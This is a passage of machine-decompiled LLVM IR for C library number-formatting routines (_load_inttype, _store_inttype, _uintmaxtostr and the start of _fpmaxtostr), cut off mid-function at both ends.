  %v2_80622e5 = load i32, i32* %v1_80622e5, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80622e9 = or i32 %v2_80622e5, 64
  store i32 %v1_80622e9, i32* %eax.global-to-local, align 4
  %v1_80622ec = trunc i32 %v1_80622e9 to i16
  %v3_80622ec = inttoptr i32 %v2_80622ec to i16*
  store i16 %v1_80622ec, i16* %v3_80622ec, align 2
  %v0_80622ef = load i32, i32* %eax.global-to-local, align 4
  %v1_80622ef = urem i32 %v0_80622ef, 65536
  store i32 %v1_80622ef, i32* %eax.global-to-local, align 4
  %v3_80622f2 = and i32 %v0_80622ef, 2816
  %v4_80622f2 = icmp eq i32 %v3_80622f2, 0
  %v1_80622f5 = icmp eq i1 %v4_80622f2, false
  br i1 %v1_80622f5, label %dec_label_pc_80622fd, label %dec_label_pc_80622f7

dec_label_pc_80622f7:                             ; preds = %dec_label_pc_80622e5
  %v0_80622f7 = load i32, i32* @ebx, align 4
  %v1_80622f7 = add i32 %v0_80622f7, 12
  %v2_80622f7 = inttoptr i32 %v1_80622f7 to i32*
  %v3_80622f7 = load i32, i32* %v2_80622f7, align 4
  store i32 %v3_80622f7, i32* %eax.global-to-local, align 4
  %v2_80622fa = add i32 %v0_80622f7, 28
  %v3_80622fa = inttoptr i32 %v2_80622fa to i32*
  store i32 %v3_80622f7, i32* %v3_80622fa, align 4
  br label %dec_label_pc_80622fd

dec_label_pc_80622fd:                             ; preds = %dec_label_pc_80622e5, %dec_label_pc_806228e, %dec_label_pc_80622f7
  %v0_80622fd = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80622fd, i32* %eax.global-to-local, align 4
  %v2_80622ff = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80622ff, i32* %edx.global-to-local, align 4
  store i32 %v0_806225c, i32* @ebx, align 4
  ret i32 %v0_80622fd

; uselistorder directives
  uselistorder i32 %v0_80622ef, { 1, 0 }
  uselistorder i32 %v1_80622b2, { 1, 0, 2 }
  uselistorder i32 %v0_80622c4, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v3_8062268, { 0, 2, 1, 3 }
  uselistorder i32 %v0_806225c, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i16 32, { 1, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80622fd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80622e5, { 1, 0 }
  uselistorder label %dec_label_pc_806227b, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_8062304 = icmp slt i32 %tmp5, 0
  %v3_8062335 = and i32 %tmp4, 2048
  %v4_8062335 = icmp eq i32 %v3_8062335, 0
  br i1 %v5_8062304, label %dec_label_pc_8062335, label %dec_label_pc_8062313

dec_label_pc_8062313:                             ; preds = %entry
  %v1_8062316 = icmp eq i1 %v4_8062335, false
  br i1 %v1_8062316, label %dec_label_pc_806233a, label %dec_label_pc_8062318

dec_label_pc_8062318:                             ; preds = %dec_label_pc_8062313
  %v6_8062318 = icmp eq i32 %tmp4, 256
  %v1_806231e = inttoptr i32 %tmp to i32*
  %v2_806231e = load i32, i32* %v1_806231e, align 4
  %v1_8062320 = icmp eq i1 %v6_8062318, false
  br i1 %v1_8062320, label %dec_label_pc_8062327, label %dec_label_pc_8062322

dec_label_pc_8062322:                             ; preds = %dec_label_pc_8062318
  %v1_8062322 = urem i32 %v2_806231e, 256
  br label %dec_label_pc_8062332

dec_label_pc_8062327:                             ; preds = %dec_label_pc_8062318
  %v6_8062327 = icmp eq i32 %tmp4, 512
  %v1_806232d = icmp eq i1 %v6_8062327, false
  br i1 %v1_806232d, label %dec_label_pc_8062332, label %dec_label_pc_806232f

dec_label_pc_806232f:                             ; preds = %dec_label_pc_8062327
  %v1_806232f = urem i32 %v2_806231e, 65536
  br label %dec_label_pc_8062332

dec_label_pc_8062332:                             ; preds = %dec_label_pc_8062327, %dec_label_pc_8062322, %dec_label_pc_806232f
  %v0_8062334 = phi i32 [ %v2_806231e, %dec_label_pc_8062327 ], [ %v1_8062322, %dec_label_pc_8062322 ], [ %v1_806232f, %dec_label_pc_806232f ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8062334

dec_label_pc_8062335:                             ; preds = %entry
  br i1 %v4_8062335, label %dec_label_pc_8062340, label %dec_label_pc_806233a

dec_label_pc_806233a:                             ; preds = %dec_label_pc_8062335, %dec_label_pc_8062313
  %v1_806233a = add i32 %tmp, 4
  %v2_806233a = inttoptr i32 %v1_806233a to i32*
  %v3_806233a = load i32, i32* %v2_806233a, align 4
  store i32 %v3_806233a, i32* @edx, align 4
  %v1_806233d = inttoptr i32 %tmp to i32*
  %v2_806233d = load i32, i32* %v1_806233d, align 4
  ret i32 %v2_806233d

dec_label_pc_8062340:                             ; preds = %dec_label_pc_8062335
  %v6_8062340 = icmp eq i32 %tmp4, 256
  %v1_8062346 = inttoptr i32 %tmp to i32*
  %v2_8062346 = load i32, i32* %v1_8062346, align 4
  %v1_8062348 = icmp eq i1 %v6_8062340, false
  br i1 %v1_8062348, label %dec_label_pc_806234f, label %dec_label_pc_806234a

dec_label_pc_806234a:                             ; preds = %dec_label_pc_8062340
  %v1_806234a = mul i32 %v2_8062346, 16777216
  %v2_806234a = sdiv i32 %v1_806234a, 16777216
  br label %dec_label_pc_8062358

dec_label_pc_806234f:                             ; preds = %dec_label_pc_8062340
  %v6_806234f = icmp eq i32 %tmp4, 512
  %v1_8062355 = icmp eq i1 %v6_806234f, false
  br i1 %v1_8062355, label %dec_label_pc_8062358, label %dec_label_pc_8062357

dec_label_pc_8062357:                             ; preds = %dec_label_pc_806234f
  %v1_8062357 = mul i32 %v2_8062346, 65536
  %v2_8062357 = sdiv i32 %v1_8062357, 65536
  br label %dec_label_pc_8062358

dec_label_pc_8062358:                             ; preds = %dec_label_pc_806234f, %dec_label_pc_806234a, %dec_label_pc_8062357
  %v0_8062358 = phi i32 [ %v2_8062346, %dec_label_pc_806234f ], [ %v2_806234a, %dec_label_pc_806234a ], [ %v2_8062357, %dec_label_pc_8062357 ]
  %v1_8062358 = ashr i32 %v0_8062358, 31
  store i32 %v1_8062358, i32* @edx, align 4
  ret i32 %v0_8062358

; uselistorder directives
  uselistorder i32 %v0_8062358, { 1, 0 }
  uselistorder i32 %v2_8062346, { 2, 0, 1 }
  uselistorder i32 %v2_806231e, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8062358, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062332, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_1()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_806235c = load i32, i32* @ebx, align 4
  store i32 %v0_806235c, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8062361 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8062361, i32* %ebx.global-to-local, align 4
  %v4_8062365 = trunc i32 %tmp4 to i16
  %v6_806236d = icmp eq i32 %tmp6, 256
  %v1_8062373 = icmp eq i1 %v6_806236d, false
  br i1 %v1_8062373, label %dec_label_pc_8062379, label %dec_label_pc_8062375

dec_label_pc_8062375:                             ; preds = %entry
  %v2_8062375 = trunc i32 %tmp4 to i8
  %v4_8062375 = bitcast i16* %tmp5 to i8*
  store i8 %v2_8062375, i8* %v4_8062375, align 1
  br label %dec_label_pc_8062397

dec_label_pc_8062379:                             ; preds = %entry
  %v6_8062379 = icmp eq i32 %tmp6, 2048
  %v1_806237f = icmp eq i1 %v6_8062379, false
  br i1 %v1_806237f, label %dec_label_pc_8062388, label %dec_label_pc_8062381

dec_label_pc_8062381:                             ; preds = %dec_label_pc_8062379
  %sext2 = mul i32 %tmp4, 65536
  %v1_8062381 = sdiv i32 %sext2, 65536
  %v3_8062381 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8062381, i32* %v3_8062381, align 4
  %v0_8062383 = load i32, i32* %edx.global-to-local, align 4
  %v1_8062383 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8062383 = add i32 %v1_8062383, 4
  %v3_8062383 = inttoptr i32 %v2_8062383 to i32*
  store i32 %v0_8062383, i32* %v3_8062383, align 4
  br label %dec_label_pc_8062397

dec_label_pc_8062388:                             ; preds = %dec_label_pc_8062379
  %v6_8062388 = icmp eq i32 %tmp6, 512
  %v1_806238e = icmp eq i1 %v6_8062388, false
  br i1 %v1_806238e, label %dec_label_pc_8062395, label %dec_label_pc_8062390

dec_label_pc_8062390:                             ; preds = %dec_label_pc_8062388
  store i16 %v4_8062365, i16* %tmp5, align 2
  br label %dec_label_pc_8062397

dec_label_pc_8062395:                             ; preds = %dec_label_pc_8062388
  %sext3 = mul i32 %tmp4, 65536
  %v1_8062395 = sdiv i32 %sext3, 65536
  %v3_8062395 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8062395, i32* %v3_8062395, align 4
  br label %dec_label_pc_8062397

dec_label_pc_8062397:                             ; preds = %dec_label_pc_8062390, %dec_label_pc_8062381, %dec_label_pc_8062375, %dec_label_pc_8062395
  %v2_8062397 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8062397, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_8062398 = sdiv i32 %sext, 65536
  ret i32 %v1_8062398

; uselistorder directives
  uselistorder label %dec_label_pc_8062397, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_80623a7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80623a7, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_80623b3 = icmp slt i32 %arg4, 0
  %v1_80623b5 = icmp eq i1 %v2_80623b3, false
  br i1 %v1_80623b5, label %dec_label_pc_80623d6, label %dec_label_pc_80623b7

dec_label_pc_80623b7:                             ; preds = %entry
  %v1_80623b7 = sub i32 0, %arg4
  store i32 %v1_80623b7, i32* %esi.global-to-local, align 4
  %v2_80623b9 = icmp slt i32 %arg3, 0
  %v1_80623bb = icmp eq i1 %v2_80623b9, false
  br i1 %v1_80623bb, label %dec_label_pc_80623d6, label %dec_label_pc_80623bd

dec_label_pc_80623bd:                             ; preds = %dec_label_pc_80623b7
  %v1_80623bd = sub i32 0, %arg2
  %v5_80623bd = icmp ne i32 %arg2, 0
  store i32 %v1_80623bd, i32* %ecx.global-to-local, align 4
  %v2_80623bf = zext i1 %v5_80623bd to i32
  %v3_80623bf = add i32 %v2_80623bf, %arg3
  %v1_80623c2 = sub i32 0, %v3_80623bf
  store i32 %v1_80623c2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80623d6

dec_label_pc_80623d6:                             ; preds = %entry, %dec_label_pc_80623b7, %dec_label_pc_80623bd
  %v0_80623db = phi i32 [ %v1_80623b7, %dec_label_pc_80623bd ], [ %v1_80623b7, %dec_label_pc_80623b7 ], [ %arg4, %entry ]
  %storemerge11 = phi i32 [ 1, %dec_label_pc_80623bd ], [ 0, %dec_label_pc_80623b7 ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_80623db
  %tmp30 = urem i32 -1, %v0_80623db
  store i8 0, i8* %arg1, align 1
  %v1_80623e0 = add i32 %tmp30, 1
  %v1_80623e1 = load i32, i32* %esi.global-to-local, align 4
  %v12_80623e1 = icmp eq i32 %v1_80623e0, %v1_80623e1
  %v1_80623eb = icmp eq i1 %v12_80623e1, false
  br i1 %v1_80623eb, label %dec_label_pc_80623fa, label %dec_label_pc_80623ed

dec_label_pc_80623ed:                             ; preds = %dec_label_pc_80623d6
  %v1_80623ed = add i32 %div, 1
  br label %dec_label_pc_80623fa

dec_label_pc_80623fa:                             ; preds = %dec_label_pc_80623d6, %dec_label_pc_80623ed
  %stack_var_-20.0.off0 = phi i32 [ %v1_80623e0, %dec_label_pc_80623d6 ], [ 0, %dec_label_pc_80623ed ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_80623d6 ], [ %v1_80623ed, %dec_label_pc_80623ed ]
  %v0_80623fa = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_80623fa, i32* %ebp.global-to-local, align 4
  %v0_80623fc = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80623fc, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8062400

dec_label_pc_8062400:                             ; preds = %dec_label_pc_806244e, %dec_label_pc_80623fa
  %v0_8062437 = phi i32 [ %v0_8062450, %dec_label_pc_806244e ], [ %v0_80623fa, %dec_label_pc_80623fa ]
  %v0_8062404 = phi i32 [ %v1_8062452, %dec_label_pc_806244e ], [ %v0_80623fc, %dec_label_pc_80623fa ]
  %v1_8062400 = icmp eq i32 %v0_8062404, 0
  br i1 %v1_8062400, label %dec_label_pc_8062437, label %dec_label_pc_8062404

dec_label_pc_8062404:                             ; preds = %dec_label_pc_8062400
  %v0_8062408 = load i32, i32* %esi.global-to-local, align 4
  %div6 = udiv i32 %v0_8062404, %v0_8062408
  %tmp31 = urem i32 %v0_8062404, %v0_8062408
  store i32 %div6, i32* %ebx.global-to-local, align 4
  %div7 = udiv i32 %v0_8062437, %v0_8062408
  %tmp32 = urem i32 %v0_8062437, %v0_8062408
  store i32 %div7, i32* %ebp.global-to-local, align 4
  %v6_806241b = mul i32 %tmp31, %stack_var_-20.0.off0
  %v2_806241f = add i32 %tmp32, %v6_806241b
  %v8_8062425 = mul i32 %tmp31, %stack_var_-24.0.in
  %v2_806242a = add i32 %div7, %v8_8062425
  store i32 %v2_806242a, i32* %ecx.global-to-local, align 4
  %div8 = udiv i32 %v2_806241f, %v0_8062408
  %tmp33 = urem i32 %v2_806241f, %v0_8062408
  %v2_8062432 = add i32 %div8, %v2_806242a
  br label %dec_label_pc_806243f

dec_label_pc_8062437:                             ; preds = %dec_label_pc_8062400
  %v0_806243b = load i32, i32* %esi.global-to-local, align 4
  %div10 = udiv i32 %v0_8062437, %v0_806243b
  %tmp34 = urem i32 %v0_8062437, %v0_806243b
  br label %dec_label_pc_806243f

dec_label_pc_806243f:                             ; preds = %dec_label_pc_8062404, %dec_label_pc_8062437
  %v13_8062445 = phi i32 [ %tmp33, %dec_label_pc_8062404 ], [ %tmp34, %dec_label_pc_8062437 ]
  %storemerge = phi i32 [ %v2_8062432, %dec_label_pc_8062404 ], [ %div10, %dec_label_pc_8062437 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_806243f = load i32, i32* %edi.global-to-local, align 4
  %v1_806243f = add i32 %v0_806243f, -1
  store i32 %v1_806243f, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v13_8062445, 10
  br i1 %tmp, label %dec_label_pc_8062445, label %dec_label_pc_806244a

dec_label_pc_8062445:                             ; preds = %dec_label_pc_806243f
  %v2_8062445 = add i32 %v13_8062445, 48
  %v12_8062445 = and i32 %v2_8062445, 255
  %v14_8062445 = and i32 %v13_8062445, -256
  %v15_8062445 = or i32 %v12_8062445, %v14_8062445
  br label %dec_label_pc_806244e

dec_label_pc_806244a:                             ; preds = %dec_label_pc_806243f
  %v6_806244a = add i32 %v13_8062445, %arg5
  %v21_806244a = and i32 %v6_806244a, 255
  %v23_806244a = and i32 %v13_8062445, -256
  %v24_806244a = or i32 %v21_806244a, %v23_806244a
  br label %dec_label_pc_806244e

dec_label_pc_806244e:                             ; preds = %dec_label_pc_8062445, %dec_label_pc_806244a
  %storemerge9 = phi i32 [ %v15_8062445, %dec_label_pc_8062445 ], [ %v24_806244a, %dec_label_pc_806244a ]
  %v1_806244e = trunc i32 %storemerge9 to i8
  %v3_806244e = inttoptr i32 %v1_806243f to i8*
  store i8 %v1_806244e, i8* %v3_806244e, align 1
  %v0_8062450 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8062452 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8062452 = or i32 %v1_8062452, %v0_8062450
  %v3_8062452 = icmp eq i32 %v2_8062452, 0
  %v1_8062454 = icmp eq i1 %v3_8062452, false
  br i1 %v1_8062454, label %dec_label_pc_8062400, label %dec_label_pc_8062456

dec_label_pc_8062456:                             ; preds = %dec_label_pc_806244e
  %v4_8062456 = icmp eq i32 %storemerge11, 0
  br i1 %v4_8062456, label %dec_label_pc_8062461, label %dec_label_pc_806245d

dec_label_pc_806245d:                             ; preds = %dec_label_pc_8062456
  %v0_806245d = load i32, i32* %edi.global-to-local, align 4
  %v1_806245d = add i32 %v0_806245d, -1
  store i32 %v1_806245d, i32* %edi.global-to-local, align 4
  %v1_806245e = inttoptr i32 %v1_806245d to i8*
  store i8 45, i8* %v1_806245e, align 1
  br label %dec_label_pc_8062461

dec_label_pc_8062461:                             ; preds = %dec_label_pc_8062456, %dec_label_pc_806245d
  %v0_8062464 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_8062464

; uselistorder directives
  uselistorder i32 %v13_8062445, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_806241f, { 1, 0 }
  uselistorder i32 %v0_8062408, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_8062404, { 1, 0, 2 }
  uselistorder i32 %v0_8062437, { 1, 0, 3, 2 }
  uselistorder i32 %v1_80623e0, { 1, 0 }
  uselistorder i32 %v0_80623db, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8062461, { 1, 0 }
  uselistorder label %dec_label_pc_806244e, { 1, 0 }
  uselistorder label %dec_label_pc_806243f, { 1, 0 }
  uselistorder label %dec_label_pc_80623fa, { 1, 0 }
  uselistorder label %dec_label_pc_80623d6, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp146 = call i16 @__decompiler_undefined_function_2()
  %tmp155 = call x86_fp80 @__decompiler_undefined_function_12()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_806246d = load i32, i32* @edi, align 4
  %v0_806246e = load i32, i32* @esi, align 4
  %v0_806246f = load i32, i32* @ebx, align 4
  store i32 %v0_806246f, i32* %stack_var_-16, align 4
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v4_8062484 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_8062484 = add i3 %v4_8062484, -1
  store x86_fp80 %tmp155, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_8062484, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_806248b = add i32 %tmp156, 4
  %v2_806248b = inttoptr i32 %v1_806248b to i32*
  %v3_806248b = load i32, i32* %v2_806248b, align 4
  store i32 %v3_806248b, i32* %eax.global-to-local, align 4
  %v1_8062492 = add i32 %tmp156, 8
  %v2_8062492 = inttoptr i32 %v1_8062492 to i8*
  %v3_8062492 = load i8, i8* %v2_8062492, align 1
  %v4_8062492 = zext i8 %v3_8062492 to i32
  %v6_8062492 = and i32 %v0_806246f, -256
  %v7_8062492 = or i32 %v4_8062492, %v6_8062492
  store i32 %v7_8062492, i32* %ebx.global-to-local, align 4
  %v1_8062495 = inttoptr i32 %tmp156 to i32*
  %v2_8062495 = load i32, i32* %v1_8062495, align 4
  store i32 %v2_8062495, i32* %ebp.global-to-local, align 4
  %v2_80624a1 = or i8 %v3_8062492, 32
  %v7_80624a1 = zext i8 %v2_80624a1 to i32
  %v9_80624a1 = and i32 %v3_806248b, -256
  %v10_80624a1 = or i32 %v7_80624a1, %v9_80624a1
  store i32 %v10_80624a1, i32* %eax.global-to-local, align 4
  %v10_80624a3 = icmp eq i8 %v2_80624a1, 97
  %v1_80624a9 = icmp eq i1 %v10_80624a3, false
  br i1 %v1_80624a9, label %dec_label_pc_80624b2, label %dec_label_pc_80624ab

dec_label_pc_80624ab:                             ; preds = %entry
  %v2_80624ab = add i8 %v3_8062492, 6
  %v15_80624ab = zext i8 %v2_80624ab to i32
  %v18_80624ab = or i32 %v15_80624ab, %v6_8062492
  store i32 %v18_80624ab, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80624b2

dec_label_pc_80624b2:                             ; preds = %entry, %dec_label_pc_80624ab
  %stack_var_-207.0 = phi i8 [ %v3_8062492, %entry ], [ %v2_80624ab, %dec_label_pc_80624ab ]
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_80624b9 = icmp slt i32 %v2_8062495, 0
  store i32 6, i32* %eax.global-to-local, align 4
  %v3_80624c8 = select i1 %v2_80624b9, i32 6, i32 %v2_8062495
  store i32 %v3_80624c8, i32* %ebp.global-to-local, align 4
  %v1_80624cb = add i32 %tmp156, 12
  %v2_80624cb = inttoptr i32 %v1_80624cb to i32*
  %v3_80624cb = load i32, i32* %v2_80624cb, align 4
  store i32 %v3_80624cb, i32* %eax.global-to-local, align 4
  %v2_80624ce = and i32 %v3_80624cb, 2
  %v3_80624ce = icmp eq i32 %v2_80624ce, 0
  br i1 %v3_80624ce, label %dec_label_pc_80624dc, label %dec_label_pc_80624e8

dec_label_pc_80624dc:                             ; preds = %dec_label_pc_80624b2
  %v2_80624dc = urem i32 %v3_80624cb, 2
  %tmp192 = trunc i32 %v2_80624dc to i8
  %tmp = sub nsw i8 0, %tmp192
  %tmp193 = and i8 %tmp, 32
  br label %dec_label_pc_80624e8

dec_label_pc_80624e8:                             ; preds = %dec_label_pc_80624dc, %dec_label_pc_80624b2
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_80624b2 ], [ %tmp193, %dec_label_pc_80624dc ]
  %not.v5_80624e8 = fcmp uno x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v5_80624e8, label %dec_label_pc_806255f, label %dec_label_pc_806250a

dec_label_pc_806250a:                             ; preds = %dec_label_pc_80624e8
  %v1_806250a = add i3 %v4_8062484, -2
  store i3 %v1_806250a, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 %tmp155, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v4_806250e = fcmp ogt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v4_806250e, label %bb, label %bb180

bb:                                               ; preds = %dec_label_pc_806250a
  br label %dec_label_pc_806259a

bb180:                                            ; preds = %dec_label_pc_806250a
  %v5_806250e = fcmp olt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v5_806250e, label %bb181, label %dec_label_pc_8062512

bb181:                                            ; preds = %bb180
  br label %dec_label_pc_806259a

dec_label_pc_8062512:                             ; preds = %bb180
  %not.v4_806250c = fcmp une x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v4_806250c, label %dec_label_pc_806259a, label %dec_label_pc_806262f

dec_label_pc_806255f:                             ; preds = %dec_label_pc_80624e8
  store i3 %v4_8062484, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_8062566 = add i32 %tmp156, 16
  %v2_8062566 = inttoptr i32 %v1_8062566 to i32*
  store i32 32, i32* %v2_8062566, align 4
  %v4_806256d = add i8 %stack_var_-207.0, -96
  %v6_806256d = sub i8 95, %stack_var_-207.0
  %v7_806256d = and i8 %v6_806256d, %stack_var_-207.0
  %v8_806256d = icmp slt i8 %v7_806256d, 0
  %v9_806256d = icmp eq i8 %v4_806256d, 0
  %v10_806256d = icmp slt i8 %v4_806256d, 0
  store i32 3, i32* %stack_var_-152, align 4
  %v3_8062582 = icmp eq i1 %v10_806256d, %v8_806256d
  %v4_8062582 = icmp eq i1 %v9_806256d, false
  %v5_8062582 = and i1 %v4_8062582, %v3_8062582
  br i1 %v5_8062582, label %dec_label_pc_8062589, label %dec_label_pc_8062584

dec_label_pc_8062584:                             ; preds = %dec_label_pc_806255f
  br label %dec_label_pc_8062589

dec_label_pc_8062589:                             ; preds = %dec_label_pc_806255f, %dec_label_pc_8062584
  %v2_8062591 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8062591, i32* @ecx, align 4
  br label %dec_label_pc_806295a

dec_label_pc_806259a:                             ; preds = %dec_label_pc_8062512, %bb181, %bb
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st1.global-to-local, align 4
  store i32 13, i32* %edx.global-to-local, align 4
  store i32 4096, i32* %ecx.global-to-local, align 4
  %v3_80625b4 = xor i3 %v4_8062484, -4
  store i3 %v3_80625b4, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_80625ba

dec_label_pc_80625ba:                             ; preds = %dec_label_pc_806260b, %dec_label_pc_806259a
  %v0_806260b = phi i32 [ 4096, %dec_label_pc_806259a ], [ %v2_806260b, %dec_label_pc_806260b ]
  %v2_80625bd = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_806259a ], [ %v2_80625bd81, %dec_label_pc_806260b ]
  %v1_80625f5 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_806259a ], [ %v0_80625ba79, %dec_label_pc_806260b ]
  %v0_806260766 = phi i32 [ 13, %dec_label_pc_806259a ], [ %v1_80625bc, %dec_label_pc_806260b ]
  %stack_var_-220.0 = phi i32 [ 8, %dec_label_pc_806259a ], [ %stack_var_-220.1, %dec_label_pc_806260b ]
  %v1_80625bc = add i32 %v0_806260766, -1
  %v4_80625bd = fcmp ule x86_fp80 %v1_80625f5, %v2_80625bd
  br i1 %v4_80625bd, label %dec_label_pc_80625e4, label %dec_label_pc_80625c1

dec_label_pc_80625c1:                             ; preds = %dec_label_pc_80625ba
  store x86_fp80 %v1_80625f5, x86_fp80* %st0.global-to-local, align 4
  %v3_80625c3 = mul i32 %v1_80625bc, 12
  store i32 %v3_80625c3, i32* %eax.global-to-local, align 4
  %v1_80625c6 = add i32 %v3_80625c3, ptrtoint (x86_fp80** @global_var_806eea0.737 to i32)
  %v2_80625c6 = inttoptr i32 %v1_80625c6 to x86_fp80*
  %v3_80625c6 = load x86_fp80, x86_fp80* %v2_80625c6, align 4
  %v4_80625cc = fmul x86_fp80 %v1_80625f5, %v3_80625c6
  store x86_fp80 %v4_80625cc, x86_fp80* %st1.global-to-local, align 4
  %v4_80625d0 = fcmp ule x86_fp80 %v4_80625cc, %v3_80625c6
  br i1 %v4_80625d0, label %dec_label_pc_8062605, label %dec_label_pc_80625d4

dec_label_pc_80625d4:                             ; preds = %dec_label_pc_80625c1
  store x86_fp80 %v4_80625cc, x86_fp80* %st1.global-to-local, align 4
  %v5_80625de = sub i32 %stack_var_-220.0, %v0_806260b
  br label %dec_label_pc_8062607

dec_label_pc_80625e4:                             ; preds = %dec_label_pc_80625ba
  %v3_80625e4 = mul i32 %v1_80625bc, 12
  store i32 %v3_80625e4, i32* %eax.global-to-local, align 4
  %v1_80625e7 = add i32 %v3_80625e4, ptrtoint (x86_fp80** @global_var_806eea0.737 to i32)
  %v2_80625e7 = inttoptr i32 %v1_80625e7 to x86_fp80*
  %v3_80625e7 = load x86_fp80, x86_fp80* %v2_80625e7, align 4
  %v4_80625ed = fdiv x86_fp80 %v3_80625e7, %v1_80625f5
  store x86_fp80 %v4_80625ed, x86_fp80* %st1.global-to-local, align 4
  %v4_80625ef = fcmp ogt x86_fp80 %v3_80625e7, %v1_80625f5
  br i1 %v4_80625ef, label %.thread55, label %bb183

.thread55:                                        ; preds = %dec_label_pc_80625e4
  store x86_fp80 %v3_80625e7, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_80625f5

